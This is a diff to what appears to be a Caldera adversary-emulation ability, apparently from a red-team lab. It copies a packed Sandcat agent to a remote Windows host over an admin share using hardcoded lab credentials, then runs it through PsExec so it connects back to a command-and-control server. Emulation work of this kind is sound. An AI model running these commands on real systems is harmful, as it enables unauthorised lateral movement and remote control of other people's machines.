@@ -1,5 +1,5 @@
-- id: tx1_lateral_deploy_sandcat
-  name: TX1 Lateral Deploy Sandcat Agent
+- id: tx0_lateral_deploy_sandcat
+  name: TX0 Lateral Deploy Sandcat Agent
   description: Copy sandcat-packed.exe to remote host and execute remotely via PsExec.
   tactic: lateral-movement
   technique:
@@ -11,13 +11,12 @@
         command: |
           net use \\172.18.24.12\C$ /user:txone tx1otdemo;
           Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
-          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'C:\Users\Public\sandcat-upx.exe', '-server', 'http://172.18.25.10:8888', '-group', 'red' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx.exe" -server http://172.18.25.10:8888 -group red' -NoNewWindow;
         payloads:
           - sandcat-upx.exe
           - psexec.exe
-        timeout: 120
   requirements:
     - plugins.stockpile.app.requirements.basic:
       - source: host.addr
         edge: equals
-        target: 172.16.24.12
+        target: 172.18.24.10
